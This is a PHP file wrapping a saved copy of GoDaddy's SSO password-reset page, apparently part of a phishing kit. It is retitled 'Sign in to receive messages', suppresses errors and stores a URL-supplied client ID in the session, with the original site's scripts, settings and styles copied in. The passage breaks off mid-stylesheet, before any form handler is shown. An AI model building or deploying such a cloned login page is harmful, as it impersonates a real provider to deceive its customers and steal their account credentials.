<?php
error_reporting(0);

ini_set("output_buffering",4096);
session_start();

$client_id = $_SESSION['client_id'] = $_GET['client_id'];

?>

<!DOCTYPE html>
<!-- saved from url=(0092)https://sso.godaddy.com/v1/account/reset?app=account&realm=idp&path=/products&isc=gofd2001aj -->
<html lang="en" class="footer-html"><head><meta http-equiv="Content-Type" content="text/html; charset=utf-8"><meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"><script type="text/javascript" async="" src="./Reset_My_Password_files/recaptcha__en.js"></script><script type="text/javascript" async="" src="./Reset_My_Password_files/analytics.js"></script><script type="text/javascript" src="./Reset_My_Password_files/4549d38e45"></script><script src="./Reset_My_Password_files/nr-1118.min.js"></script><script type="text/javascript">(window.NREUM||(NREUM={})).loader_config={xpid:"XAEBWFNVGwcCU1JRAAID"};window.NREUM||(NREUM={}),__nr_require=function(t,n,e){function r(e){if(!n[e]){var o=n[e]={exports:{}};t[e][0].call(o.exports,function(n){var o=t[e][1][n];return r(o||n)},o,o.exports)}return n[e].exports}if("function"==typeof __nr_require)return __nr_require;for(var o=0;o<e.length;o++)r(e[o]);return r}({1:[function(t,n,e){function r(t){try{s.console&&console.log(t)}catch(n){}}var o,i=t("ee"),a=t(16),s={};try{o=localStorage.getItem("__nr_flags").split(","),console&&"function"==typeof console.log&&(s.console=!0,o.indexOf("dev")!==-1&&(s.dev=!0),o.indexOf("nr_dev")!==-1&&(s.nrDev=!0))}catch(c){}s.nrDev&&i.on("internal-error",function(t){r(t.stack)}),s.dev&&i.on("fn-err",function(t,n,e){r(e.stack)}),s.dev&&(r("NR AGENT IN DEVELOPMENT MODE"),r("flags: "+a(s,function(t,n){return t}).join(", ")))},{}],2:[function(t,n,e){function r(t,n,e,r,s){try{p?p-=1:o(s||new UncaughtException(t,n,e),!0)}catch(f){try{i("ierr",[f,c.now(),!0])}catch(d){}}return"function"==typeof u&&u.apply(this,a(arguments))}function UncaughtException(t,n,e){this.message=t||"Uncaught error with no additional information",this.sourceURL=n,this.line=e}function o(t,n){var e=n?null:c.now();i("err",[t,e])}var i=t("handle"),a=t(17),s=t("ee"),c=t("loader"),f=t("gos"),u=window.onerror,d=!1,l="nr@seenError",p=0;c.features.err=!0,t(1),window.onerror=r;try{throw new Error}catch(h){"stack"in h&&(t(8),t(7),"addEventListener"in window&&t(5),c.xhrWrappable&&t(9),d=!0)}s.on("fn-start",function(t,n,e){d&&(p+=1)}),s.on("fn-err",function(t,n,e){d&&!e[l]&&(f(e,l,function(){return!0}),this.thrown=!0,o(e))}),s.on("fn-end",function(){d&&!this.thrown&&p>0&&(p-=1)}),s.on("internal-error",function(t){i("ierr",[t,c.now(),!0])})},{}],3:[function(t,n,e){t("loader").features.ins=!0},{}],4:[function(t,n,e){function r(t){}if(window.performance&&window.performance.timing&&window.performance.getEntriesByType){var o=t("ee"),i=t("handle"),a=t(8),s=t(7),c="learResourceTimings",f="addEventListener",u="resourcetimingbufferfull",d="bstResource",l="resource",p="-start",h="-end",m="fn"+p,v="fn"+h,w="bstTimer",y="pushState",g=t("loader");g.features.stn=!0,t(6);var b=NREUM.o.EV;o.on(m,function(t,n){var e=t[0];e instanceof b&&(this.bstStart=g.now())}),o.on(v,function(t,n){var e=t[0];e instanceof b&&i("bst",[e,n,this.bstStart,g.now()])}),a.on(m,function(t,n,e){this.bstStart=g.now(),this.bstType=e}),a.on(v,function(t,n){i(w,[n,this.bstStart,g.now(),this.bstType])}),s.on(m,function(){this.bstStart=g.now()}),s.on(v,function(t,n){i(w,[n,this.bstStart,g.now(),"requestAnimationFrame"])}),o.on(y+p,function(t){this.time=g.now(),this.startPath=location.pathname+location.hash}),o.on(y+h,function(t){i("bstHist",[location.pathname+location.hash,this.startPath,this.time])}),f in window.performance&&(window.performance["c"+c]?window.performance[f](u,function(t){i(d,[window.performance.getEntriesByType(l)]),window.performance["c"+c]()},!1):window.performance[f]("webkit"+u,function(t){i(d,[window.performance.getEntriesByType(l)]),window.performance["webkitC"+c]()},!1)),document[f]("scroll",r,{passive:!0}),document[f]("keypress",r,!1),document[f]("click",r,!1)}},{}],5:[function(t,n,e){function r(t){for(var n=t;n&&!n.hasOwnProperty(u);)n=Object.getPrototypeOf(n);n&&o(n)}function o(t){s.inPlace(t,[u,d],"-",i)}function i(t,n){return t[1]}var a=t("ee").get("events"),s=t(19)(a,!0),c=t("gos"),f=XMLHttpRequest,u="addEventListener",d="removeEventListener";n.exports=a,"getPrototypeOf"in Object?(r(document),r(window),r(f.prototype)):f.prototype.hasOwnProperty(u)&&(o(window),o(f.prototype)),a.on(u+"-start",function(t,n){var e=t[1],r=c(e,"nr@wrapped",function(){function t(){if("function"==typeof e.handleEvent)return e.handleEvent.apply(e,arguments)}var n={object:t,"function":e}[typeof e];return n?s(n,"fn-",null,n.name||"anonymous"):e});this.wrapped=t[1]=r}),a.on(d+"-start",function(t){t[1]=this.wrapped||t[1]})},{}],6:[function(t,n,e){var r=t("ee").get("history"),o=t(19)(r);n.exports=r,o.inPlace(window.history,["pushState","replaceState"],"-")},{}],7:[function(t,n,e){var r=t("ee").get("raf"),o=t(19)(r),i="equestAnimationFrame";n.exports=r,o.inPlace(window,["r"+i,"mozR"+i,"webkitR"+i,"msR"+i],"raf-"),r.on("raf-start",function(t){t[0]=o(t[0],"fn-")})},{}],8:[function(t,n,e){function r(t,n,e){t[0]=a(t[0],"fn-",null,e)}function o(t,n,e){this.method=e,this.timerDuration=isNaN(t[1])?0:+t[1],t[0]=a(t[0],"fn-",this,e)}var i=t("ee").get("timer"),a=t(19)(i),s="setTimeout",c="setInterval",f="clearTimeout",u="-start",d="-";n.exports=i,a.inPlace(window,[s,"setImmediate"],s+d),a.inPlace(window,[c],c+d),a.inPlace(window,[f,"clearImmediate"],f+d),i.on(c+u,r),i.on(s+u,o)},{}],9:[function(t,n,e){function r(t,n){d.inPlace(n,["onreadystatechange"],"fn-",s)}function o(){var t=this,n=u.context(t);t.readyState>3&&!n.resolved&&(n.resolved=!0,u.emit("xhr-resolved",[],t)),d.inPlace(t,y,"fn-",s)}function i(t){g.push(t),h&&(x?x.then(a):v?v(a):(E=-E,O.data=E))}function a(){for(var t=0;t<g.length;t++)r([],g[t]);g.length&&(g=[])}function s(t,n){return n}function c(t,n){for(var e in t)n[e]=t[e];return n}t(5);var f=t("ee"),u=f.get("xhr"),d=t(19)(u),l=NREUM.o,p=l.XHR,h=l.MO,m=l.PR,v=l.SI,w="readystatechange",y=["onload","onerror","onabort","onloadstart","onloadend","onprogress","ontimeout"],g=[];n.exports=u;var b=window.XMLHttpRequest=function(t){var n=new p(t);try{u.emit("new-xhr",[n],n),n.addEventListener(w,o,!1)}catch(e){try{u.emit("internal-error",[e])}catch(r){}}return n};if(c(p,b),b.prototype=p.prototype,d.inPlace(b.prototype,["open","send"],"-xhr-",s),u.on("send-xhr-start",function(t,n){r(t,n),i(n)}),u.on("open-xhr-start",r),h){var x=m&&m.resolve();if(!v&&!m){var E=1,O=document.createTextNode(E);new h(a).observe(O,{characterData:!0})}}else f.on("fn-end",function(t){t[0]&&t[0].type===w||a()})},{}],10:[function(t,n,e){function r(t){var n=this.params,e=this.metrics;if(!this.ended){this.ended=!0;for(var r=0;r<d;r++)t.removeEventListener(u[r],this.listener,!1);if(!n.aborted){if(e.duration=a.now()-this.startTime,4===t.readyState){n.status=t.status;var i=o(t,this.lastSize);if(i&&(e.rxSize=i),this.sameOrigin){var c=t.getResponseHeader("X-NewRelic-App-Data");c&&(n.cat=c.split(", ").pop())}}else n.status=0;e.cbTime=this.cbTime,f.emit("xhr-done",[t],t),s("xhr",[n,e,this.startTime])}}}function o(t,n){var e=t.responseType;if("json"===e&&null!==n)return n;var r="arraybuffer"===e||"blob"===e||"json"===e?t.response:t.responseText;return h(r)}function i(t,n){var e=c(n),r=t.params;r.host=e.hostname+":"+e.port,r.pathname=e.pathname,t.sameOrigin=e.sameOrigin}var a=t("loader");if(a.xhrWrappable){var s=t("handle"),c=t(11),f=t("ee"),u=["load","error","abort","timeout"],d=u.length,l=t("id"),p=t(14),h=t(13),m=window.XMLHttpRequest;a.features.xhr=!0,t(9),f.on("new-xhr",function(t){var n=this;n.totalCbs=0,n.called=0,n.cbTime=0,n.end=r,n.ended=!1,n.xhrGuids={},n.lastSize=null,p&&(p>34||p<10)||window.opera||t.addEventListener("progress",function(t){n.lastSize=t.loaded},!1)}),f.on("open-xhr-start",function(t){this.params={method:t[0]},i(this,t[1]),this.metrics={}}),f.on("open-xhr-end",function(t,n){"loader_config"in NREUM&&"xpid"in NREUM.loader_config&&this.sameOrigin&&n.setRequestHeader("X-NewRelic-ID",NREUM.loader_config.xpid)}),f.on("send-xhr-start",function(t,n){var e=this.metrics,r=t[0],o=this;if(e&&r){var i=h(r);i&&(e.txSize=i)}this.startTime=a.now(),this.listener=function(t){try{"abort"===t.type&&(o.params.aborted=!0),("load"!==t.type||o.called===o.totalCbs&&(o.onloadCalled||"function"!=typeof n.onload))&&o.end(n)}catch(e){try{f.emit("internal-error",[e])}catch(r){}}};for(var s=0;s<d;s++)n.addEventListener(u[s],this.listener,!1)}),f.on("xhr-cb-time",function(t,n,e){this.cbTime+=t,n?this.onloadCalled=!0:this.called+=1,this.called!==this.totalCbs||!this.onloadCalled&&"function"==typeof e.onload||this.end(e)}),f.on("xhr-load-added",function(t,n){var e=""+l(t)+!!n;this.xhrGuids&&!this.xhrGuids[e]&&(this.xhrGuids[e]=!0,this.totalCbs+=1)}),f.on("xhr-load-removed",function(t,n){var e=""+l(t)+!!n;this.xhrGuids&&this.xhrGuids[e]&&(delete this.xhrGuids[e],this.totalCbs-=1)}),f.on("addEventListener-end",function(t,n){n instanceof m&&"load"===t[0]&&f.emit("xhr-load-added",[t[1],t[2]],n)}),f.on("removeEventListener-end",function(t,n){n instanceof m&&"load"===t[0]&&f.emit("xhr-load-removed",[t[1],t[2]],n)}),f.on("fn-start",function(t,n,e){n instanceof m&&("onload"===e&&(this.onload=!0),("load"===(t[0]&&t[0].type)||this.onload)&&(this.xhrCbStart=a.now()))}),f.on("fn-end",function(t,n){this.xhrCbStart&&f.emit("xhr-cb-time",[a.now()-this.xhrCbStart,this.onload,n],n)})}},{}],11:[function(t,n,e){n.exports=function(t){var n=document.createElement("a"),e=window.location,r={};n.href=t,r.port=n.port;var o=n.href.split("://");!r.port&&o[1]&&(r.port=o[1].split("/")[0].split("@").pop().split(":")[1]),r.port&&"0"!==r.port||(r.port="https"===o[0]?"443":"80"),r.hostname=n.hostname||e.hostname,r.pathname=n.pathname,r.protocol=o[0],"/"!==r.pathname.charAt(0)&&(r.pathname="/"+r.pathname);var i=!n.protocol||":"===n.protocol||n.protocol===e.protocol,a=n.hostname===document.domain&&n.port===e.port;return r.sameOrigin=i&&(!n.hostname||a),r}},{}],12:[function(t,n,e){function r(){}function o(t,n,e){return function(){return i(t,[f.now()].concat(s(arguments)),n?null:this,e),n?void 0:this}}var i=t("handle"),a=t(16),s=t(17),c=t("ee").get("tracer"),f=t("loader"),u=NREUM;"undefined"==typeof window.newrelic&&(newrelic=u);var d=["setPageViewName","setCustomAttribute","setErrorHandler","finished","addToTrace","inlineHit","addRelease"],l="api-",p=l+"ixn-";a(d,function(t,n){u[n]=o(l+n,!0,"api")}),u.addPageAction=o(l+"addPageAction",!0),u.setCurrentRouteName=o(l+"routeName",!0),n.exports=newrelic,u.interaction=function(){return(new r).get()};var h=r.prototype={createTracer:function(t,n){var e={},r=this,o="function"==typeof n;return i(p+"tracer",[f.now(),t,e],r),function(){if(c.emit((o?"":"no-")+"fn-start",[f.now(),r,o],e),o)try{return n.apply(this,arguments)}catch(t){throw c.emit("fn-err",[arguments,this,t],e),t}finally{c.emit("fn-end",[f.now()],e)}}}};a("actionText,setName,setAttribute,save,ignore,onEnd,getContext,end,get".split(","),function(t,n){h[n]=o(p+n)}),newrelic.noticeError=function(t,n){"string"==typeof t&&(t=new Error(t)),i("err",[t,f.now(),!1,n])}},{}],13:[function(t,n,e){n.exports=function(t){if("string"==typeof t&&t.length)return t.length;if("object"==typeof t){if("undefined"!=typeof ArrayBuffer&&t instanceof ArrayBuffer&&t.byteLength)return t.byteLength;if("undefined"!=typeof Blob&&t instanceof Blob&&t.size)return t.size;if(!("undefined"!=typeof FormData&&t instanceof FormData))try{return JSON.stringify(t).length}catch(n){return}}}},{}],14:[function(t,n,e){var r=0,o=navigator.userAgent.match(/Firefox[\/\s](\d+\.\d+)/);o&&(r=+o[1]),n.exports=r},{}],15:[function(t,n,e){function r(t,n){if(!o)return!1;if(t!==o)return!1;if(!n)return!0;if(!i)return!1;for(var e=i.split("."),r=n.split("."),a=0;a<r.length;a++)if(r[a]!==e[a])return!1;return!0}var o=null,i=null,a=/Version\/(\S+)\s+Safari/;if(navigator.userAgent){var s=navigator.userAgent,c=s.match(a);c&&s.indexOf("Chrome")===-1&&s.indexOf("Chromium")===-1&&(o="Safari",i=c[1])}n.exports={agent:o,version:i,match:r}},{}],16:[function(t,n,e){function r(t,n){var e=[],r="",i=0;for(r in t)o.call(t,r)&&(e[i]=n(r,t[r]),i+=1);return e}var o=Object.prototype.hasOwnProperty;n.exports=r},{}],17:[function(t,n,e){function r(t,n,e){n||(n=0),"undefined"==typeof e&&(e=t?t.length:0);for(var r=-1,o=e-n||0,i=Array(o<0?0:o);++r<o;)i[r]=t[n+r];return i}n.exports=r},{}],18:[function(t,n,e){n.exports={exists:"undefined"!=typeof window.performance&&window.performance.timing&&"undefined"!=typeof window.performance.timing.navigationStart}},{}],19:[function(t,n,e){function r(t){return!(t&&t instanceof Function&&t.apply&&!t[a])}var o=t("ee"),i=t(17),a="nr@original",s=Object.prototype.hasOwnProperty,c=!1;n.exports=function(t,n){function e(t,n,e,o){function nrWrapper(){var r,a,s,c;try{a=this,r=i(arguments),s="function"==typeof e?e(r,a):e||{}}catch(f){l([f,"",[r,a,o],s])}u(n+"start",[r,a,o],s);try{return c=t.apply(a,r)}catch(d){throw u(n+"err",[r,a,d],s),d}finally{u(n+"end",[r,a,c],s)}}return r(t)?t:(n||(n=""),nrWrapper[a]=t,d(t,nrWrapper),nrWrapper)}function f(t,n,o,i){o||(o="");var a,s,c,f="-"===o.charAt(0);for(c=0;c<n.length;c++)s=n[c],a=t[s],r(a)||(t[s]=e(a,f?s+o:o,i,s))}function u(e,r,o){if(!c||n){var i=c;c=!0;try{t.emit(e,r,o,n)}catch(a){l([a,e,r,o])}c=i}}function d(t,n){if(Object.defineProperty&&Object.keys)try{var e=Object.keys(t);return e.forEach(function(e){Object.defineProperty(n,e,{get:function(){return t[e]},set:function(n){return t[e]=n,n}})}),n}catch(r){l([r])}for(var o in t)s.call(t,o)&&(n[o]=t[o]);return n}function l(n){try{t.emit("internal-error",n)}catch(e){}}return t||(t=o),e.inPlace=f,e.flag=a,e}},{}],ee:[function(t,n,e){function r(){}function o(t){function n(t){return t&&t instanceof r?t:t?c(t,s,i):i()}function e(e,r,o,i){if(!l.aborted||i){t&&t(e,r,o);for(var a=n(o),s=m(e),c=s.length,f=0;f<c;f++)s[f].apply(a,r);var d=u[g[e]];return d&&d.push([b,e,r,a]),a}}function p(t,n){y[t]=m(t).concat(n)}function h(t,n){var e=y[t];if(e)for(var r=0;r<e.length;r++)e[r]===n&&e.splice(r,1)}function m(t){return y[t]||[]}function v(t){return d[t]=d[t]||o(e)}function w(t,n){f(t,function(t,e){n=n||"feature",g[e]=n,n in u||(u[n]=[])})}var y={},g={},b={on:p,addEventListener:p,removeEventListener:h,emit:e,get:v,listeners:m,context:n,buffer:w,abort:a,aborted:!1};return b}function i(){return new r}function a(){(u.api||u.feature)&&(l.aborted=!0,u=l.backlog={})}var s="nr@context",c=t("gos"),f=t(16),u={},d={},l=n.exports=o();l.backlog=u},{}],gos:[function(t,n,e){function r(t,n,e){if(o.call(t,n))return t[n];var r=e();if(Object.defineProperty&&Object.keys)try{return Object.defineProperty(t,n,{value:r,writable:!0,enumerable:!1}),r}catch(i){}return t[n]=r,r}var o=Object.prototype.hasOwnProperty;n.exports=r},{}],handle:[function(t,n,e){function r(t,n,e,r){o.buffer([t],r),o.emit(t,n,e)}var o=t("ee").get("handle");n.exports=r,r.ee=o},{}],id:[function(t,n,e){function r(t){var n=typeof t;return!t||"object"!==n&&"function"!==n?-1:t===window?0:a(t,i,function(){return o++})}var o=1,i="nr@id",a=t("gos");n.exports=r},{}],loader:[function(t,n,e){function r(){if(!E++){var t=x.info=NREUM.info,n=p.getElementsByTagName("script")[0];if(setTimeout(u.abort,3e4),!(t&&t.licenseKey&&t.applicationID&&n))return u.abort();f(g,function(n,e){t[n]||(t[n]=e)}),c("mark",["onload",a()+x.offset],null,"api");var e=p.createElement("script");e.src="https://"+t.agent,n.parentNode.insertBefore(e,n)}}function o(){"complete"===p.readyState&&i()}function i(){c("mark",["domContent",a()+x.offset],null,"api")}function a(){return O.exists&&performance.now?Math.round(performance.now()):(s=Math.max((new Date).getTime(),s))-x.offset}var s=(new Date).getTime(),c=t("handle"),f=t(16),u=t("ee"),d=t(15),l=window,p=l.document,h="addEventListener",m="attachEvent",v=l.XMLHttpRequest,w=v&&v.prototype;NREUM.o={ST:setTimeout,SI:l.setImmediate,CT:clearTimeout,XHR:v,REQ:l.Request,EV:l.Event,PR:l.Promise,MO:l.MutationObserver};var y=""+location,g={beacon:"bam.nr-data.net",errorBeacon:"bam.nr-data.net",agent:"js-agent.newrelic.com/nr-1118.min.js"},b=v&&w&&w[h]&&!/CriOS/.test(navigator.userAgent),x=n.exports={offset:s,now:a,origin:y,features:{},xhrWrappable:b,userAgent:d};t(12),p[h]?(p[h]("DOMContentLoaded",i,!1),l[h]("load",r,!1)):(p[m]("onreadystatechange",o),l[m]("onload",r)),c("mark",["firstbyte",s],null,"api");var E=0,O=t(18)},{}]},{},["loader",2,10,4,3]);</script><script type="text/javascript">window.NREUM||(NREUM={});NREUM.info={"beacon":"bam.nr-data.net","errorBeacon":"bam.nr-data.net","licenseKey":"4549d38e45","applicationID":"42733734","transactionName":"bwAAMhFZCBJSAhddX1ZKJBMNWxIIXA9MVUVMDUwQCl0REh0NAk1fTRFMEApdERIdFQZZQFQEFgM8Tg8ERFs3UV1ICQMSBm4PBERPBFFE","queueTime":1,"applicationTime":50,"agent":""}</script><meta name="google" content="notranslate"><meta name="viewport" content="width=device-width, initial-scale=1"><title>Sign in to receive messages</title><link rel="preload" href="https://img1.wsimg.com/ux/fonts/uxfont/1.4/uxfont.woff2" as="font" type="font/woff2" crossorigin=""><link rel="preload" href="https://img1.wsimg.com/ux/fonts/uxfont/1.4/uxfont-2.woff2" as="font" type="font/woff2" crossorigin=""><link rel="preload" href="https://img1.wsimg.com/ux/fonts/boing/1.0/Boing-Bold.woff2" as="font" type="font/woff2" crossorigin=""><link rel="preload" href="https://img1.wsimg.com/ux/fonts/sherpa/1.0/gdsherpa-bold.woff2" as="font" type="font/woff2" crossorigin=""><link rel="preload" href="https://img1.wsimg.com/ux/fonts/sherpa/1.0/gdsherpa-regular.woff2" as="font" type="font/woff2" crossorigin=""><style>
@font-face {
  font-family: uxfont;
  src: url(//img1.wsimg.com/ux/fonts/uxfont/1.4/uxfont.woff2) format("woff2"), url(//img1.wsimg.com/ux/fonts/uxfont/1.4/uxfont.woff) format("woff");
  font-display: block;
}
@font-face {
  font-family: uxfont-2;
  src: url(//img1.wsimg.com/ux/fonts/uxfont/1.4/uxfont-2.woff2) format("woff2"), url(//img1.wsimg.com/ux/fonts/uxfont/1.4/uxfont-2.woff) format("woff");
  font-display: block;
}
@font-face {
  font-family: Boing-Bold;
  src: url(//img1.wsimg.com/ux/fonts/boing/1.0/Boing-Bold.woff2) format("woff2"), url(//img1.wsimg.com/ux/fonts/boing/1.0/Boing-Bold.woff) format("woff");
  font-display: swap;
}
@font-face {
  font-family: gdsherpa;
  src: url(//img1.wsimg.com/ux/fonts/sherpa/1.0/gdsherpa-bold.woff2) format("woff2"), url(//img1.wsimg.com/ux/fonts/sherpa/1.0/gdsherpa-bold.woff) format("woff");
  font-weight: 700;
  font-display: swap;
}
@font-face {
  font-family: gdsherpa;
  src: url(//img1.wsimg.com/ux/fonts/sherpa/1.0/gdsherpa-regular.woff2) format("woff2"), url(//img1.wsimg.com/ux/fonts/sherpa/1.0/gdsherpa-regular.woff) format("woff");
  font-display: swap;
}
</style><link rel="stylesheet" href="./Reset_My_Password_files/uxcore2.min.css" media="all"><link rel="stylesheet" href="./Reset_My_Password_files/utilityheader.min.css" media="all"><link rel="apple-touch-icon" sizes="57x57" href="https://img1.wsimg.com/ux/favicon/apple-icon-57x57.png"><link rel="apple-touch-icon" sizes="60x60" href="https://img1.wsimg.com/ux/favicon/apple-icon-60x60.png"><link rel="apple-touch-icon" sizes="72x72" href="https://img1.wsimg.com/ux/favicon/apple-icon-72x72.png"><link rel="apple-touch-icon" sizes="76x76" href="https://img1.wsimg.com/ux/favicon/apple-icon-76x76.png"><link rel="apple-touch-icon" sizes="114x114" href="https://img1.wsimg.com/ux/favicon/apple-icon-114x114.png"><link rel="apple-touch-icon" sizes="120x120" href="https://img1.wsimg.com/ux/favicon/apple-icon-120x120.png"><link rel="apple-touch-icon" sizes="144x144" href="https://img1.wsimg.com/ux/favicon/apple-icon-144x144.png"><link rel="apple-touch-icon" sizes="152x152" href="https://img1.wsimg.com/ux/favicon/apple-icon-152x152.png"><link rel="apple-touch-icon" sizes="180x180" href="https://img1.wsimg.com/ux/favicon/apple-icon-180x180.png"><link rel="icon" type="image/png" sizes="192x192" href="https://img1.wsimg.com/ux/favicon/android-icon-192x192.png"><link rel="icon" type="image/png" sizes="32x32" href="https://img1.wsimg.com/ux/favicon/favicon-32x32.png"><link rel="icon" type="image/png" sizes="96x96" href="https://img1.wsimg.com/ux/favicon/favicon-96x96.png"><link rel="icon" type="image/png" sizes="16x16" href="https://img1.wsimg.com/ux/favicon/favicon-16x16.png"><link rel="manifest" href="https://img1.wsimg.com/ux/favicon/manifest.json"><link rel="mask-icon" href="https://img1.wsimg.com/ux/favicon/favicon-16x16.svg" color="black"><meta name="msapplication-TileColor" content="#ffffff"><meta name="msapplication-TileImage" content="//img1.wsimg.com/ux/favicon/ms-icon-144x144.png"><meta name="msapplication-config" content="//img1.wsimg.com/ux/favicon/browserconfig.xml"><meta name="theme-color" content="#ffffff"><style>#password-reset-container-row{margin-top:40px}body.ux-app.uxf-flex.market-selector-open{overflow:scroll}@media screen and (max-width:991px){#password-reset-container-row{margin-top:10px}}@media screen and (max-width:519px){#password-reset-container-row{margin-top:0}}@media screen and (min-width:1110px){.container-width-limit{max-width:555px;float:none;position:relative;margin:0 auto}}</style><link href="https://img1.wsimg.com/auth/v1/static/1995/img/favicon.ico" rel="shortcut icon" type="image/vnd.microsoft.icon"><script>

        //bfcache handling for safari on ipad
        window.onpageshow = function(event) {
            if (event.persisted) {
                window.location.reload()
            }
        };

       window.ssoGlobals = window.ssoGlobals || {};
       window.ssoGlobals.status =  undefined ;
       window.ssoGlobals.plid =  Number('1') ;
       window.ssoGlobals.version = 'v1';
       window.ssoGlobals.market = "en_US";
       window.ssoGlobals.enable_clicktale =  false ;
       window.ssoGlobals.is_china =  false ;
       window.ssoGlobals.url_params = {'app': 'account', 'realm': 'idp', 'path': '/products', 'isc': 'gofd2001aj'};
       window.ssoGlobals.origin_path = 'v1%2Faccount%2Freset'

        window.sso                   = window.sso || {};
        window.sso.status            =  undefined ;
        window.sso.version           = 'v1';
        window.sso.host              = "#";
        window.sso.plid              = 1;
        window.sso.auth_type         = "";
        window.sso.default_app_for_realm = "www"
        window.sso.app               = "";
        window.sso.path              = "";
        window.sso.market            = "en_US";
        window.sso.traffic_prefix   = "";
        window.sso.is_china          = "False"=="True";
        window.sso.url_params        = {'app': 'account', 'realm': 'idp', 'path': '/products', 'isc': 'gofd2001aj'};
        window.sso.realm             = "idp"
        window.sso.locale_static_url = "https://img1.wsimg.com/auth/v1/static/1995/react/locale/en_US.json"
        window.sso.splits ={'active': {}, 'data': {}};
        window.sso.consent_show_button =  undefined ;
        window.sso.consent_show_checkbox =  undefined ;
        window.sso.iframe =  false ;
        window.sso.login_info_username       =  undefined ;
        window.sso.login_info_remember_me    =  false ;
        window.sso.show_u2f =  false ;
        window.sso.is_wechat_market = "False"=="True";

        // iterate over active plits and pass to experimentation traffic
        for (split in window.sso.splits.active) {
          var _expDataLayer = window._expDataLayer || [];
           _expDataLayer.push({
               'schema': 'add_experiment',
               'version': 'v1',
               'data': {
                   'experiment_id': 'sso.' + split,
                   'variant_id': window.sso.splits.active[split]
               }
           });
        }

       var ux = ux || {};
       ux.eldorado = ux.eldorado || {};
       ux.eldorado.page = {
         domain: 'godaddy.com',     // Domain page is loaded on.
         shopperId: '',        // ID of the logged in shopper.                           //
         version: 'v1',              // Version of your Application.
         server: 'a2plcauth002',       // Hostname of server that handled this request.
         sso: {                   // (Optional)
           app: 'sso',    // Custom SSO app name if different from UX Platform app name.
           page: '/login'  // HTTP path to the current page (Used by SSO for redirects).
        },
        currentPage: 'v1%2Faccount%2Freset',
        urlArgs: {'app': 'account', 'realm': 'idp', 'path': '/products', 'isc': 'gofd2001aj'},
        disableDeprecationBanner: true,
        hideAccountDelegationBanner: true
       };

       // Disable traffic for PASS
       

    </script><meta name="google-site-verification" content="t7JT1iH2iscenNr74R-kgXPljL_ru6OPiT9RE8zDk04"><script src="./Reset_My_Password_files/tcc.min.js"></script><script src="./Reset_My_Password_files/polyfill.min.js"></script><script src="./Reset_My_Password_files/vendor.min.js"></script><script src="./Reset_My_Password_files/uxcore2.min.js"></script><script src="./Reset_My_Password_files/utilityheader.min.js"></script><script type="text/javascript" async="" src="./Reset_My_Password_files/js"></script><style type="text/css">.round-key-cls-1 {
  fill:#2b2b2b;
  stroke:#000;
  stroke-linecap:round;
  stroke-linejoin:round;
  stroke-width:4px;
}
.round-key-cls-2 {
  fill:#757575;
}
.round-key-cls-3{
  fill:#999;
}
#round-security-key-svg {
  min-width: 100px;
  min-height: 100px;
}

@media screen and (max-width: 330px) {
  #round-security-key-svg {
    height: 50px;
    width: 50px;
  }
}</style><style type="text/css">.rect-key-cls-1 {
  fill:#2b2b2b;
}
.rect-key-cls-1,
.rect-key-cls-2 {
  stroke:#000;
  stroke-linecap:round;
  stroke-linejoin:round;
  stroke-width:4px;
}
.rect-key-cls-2{
  fill:#1a1a1a;
}
.rect-key-cls-3{
  fill:#fed317;
}
#rectangular-security-key-svg {
  min-width: 100px;
  min-height: 100px;
}

@media screen and (max-width: 330px) {
  #rectangular-security-key-svg {
    height: 50px;
    width: 50px;
  }
}</style><style type="text/css">.st0 {
  fill: #EF6C0F
}
.st1 {
  fill: #111111
}
.st2 {
  fill: #FFFFFF
}
.st3 {
  fill: #02C54C
}
.st4 {
  fill: #FEDC45
}
.st5 {
  fill: none
}
</style><style type="text/css">/* MARGINS & PADDINGS */
.p-none {
  padding: 0 !important; }

.p-xxs {
  padding: 5px !important; }

.p-xs {
  padding: 10px !important; }

.p-sm {
  padding: 15px !important; }

.p-m {
  padding: 20px !important; }

.p-md {
  padding: 25px !important; }

.p-lg {
  padding: 30px !important; }

.p-xl {
  padding: 40px !important; }

.p-t-none {
  padding-top: 0; }

.p-t-xxs {
  padding-top: 5px; }

.p-t-xs {
  padding-top: 10px; }

.p-t-sm {
  padding-top: 15px; }

.p-t-m {
  padding-top: 20px; }

.p-t-md {
  padding-top: 25px; }

.p-t-lg {
  padding-top: 30px; }

.p-t-xl {
  padding-top: 40px; }

.m-xxs {
  margin: 2px 4px; }

.m-xs {
  margin: 5px; }

.m-sm {
  margin: 10px; }

.m {
  margin: 15px; }

.m-md {
  margin: 20px; }

.m-lg {
  margin: 30px; }

.m-xl {
  margin: 50px; }

.m-none {
  margin: 0 !important; }

.m-l-none {
  margin-left: 0; }

.m-l-xs {
  margin-left: 5px; }

.m-l-sm {
  margin-left: 10px; }

.m-l {
  margin-left: 15px; }

.m-l-md {
  margin-left: 20px; }

.m-l-lg {
  margin-left: 30px; }

.m-l-xl {
  margin-left: 40px; }

.m-l-n-xxs {
  margin-left: -1px; }

.m-l-n-xs {
  margin-left: -5px; }

.m-l-n-sm {
  margin-left: -10px; }

.m-l-n {
  margin-left: -15px; }

.m-l-n-md {
  margin-left: -20px; }

.m-l-n-lg {
  margin-left: -30px; }

.m-l-n-xl {
  margin-left: -40px; }

.m-t-none {
  margin-top: 0; }

.m-t-xxs {
  margin-top: 1px; }

.m-t-xs {
  margin-top: 5px; }

.m-t-sm {
  margin-top: 10px; }

.m-t {
  margin-top: 15px; }

.m-t-md {
  margin-top: 20px; }

.m-t-lg {
  margin-top: 30px; }

.m-t-xl {
  margin-top: 40px; }

.m-t-xxl {
  margin-top: 50px; }

.m-t-xxxl {
  margin-top: 60px; }

.m-t-n-xxs {
  margin-top: -1px; }

.m-t-n-xs {
  margin-top: -5px; }

.m-t-n-sm {
  margin-top: -10px; }

.m-t-n {
  margin-top: -15px; }

.m-t-n-md {
  margin-top: -20px; }

.m-t-n-lg {
  margin-top: -30px; }

.m-t-n-xl {
  margin-top: -40px; }

.m-r-none {
  margin-right: 0; }

.m-r-xxs {
  margin-right: 1px; }

.m-r-xs {
  margin-right: 5px; }

.m-r-sm {
  margin-right: 10px; }

.m-r {
  margin-right: 15px; }

.m-r-md {
  margin-right: 20px; }

.m-r-lg {
  margin-right: 30px; }

.m-r-xl {
  margin-right: 40px; }

.m-r-n-xxs {
  margin-right: -1px; }

.m-r-n-xs {
  margin-right: -5px; }

.m-r-n-sm {
  margin-right: -10px; }

.m-r-n {
  margin-right: -15px; }

.m-r-n-md {
  margin-right: -20px; }

.m-r-n-lg {
  margin-right: -30px; }

.m-r-n-xl {
  margin-right: -40px; }

.m-b-none {
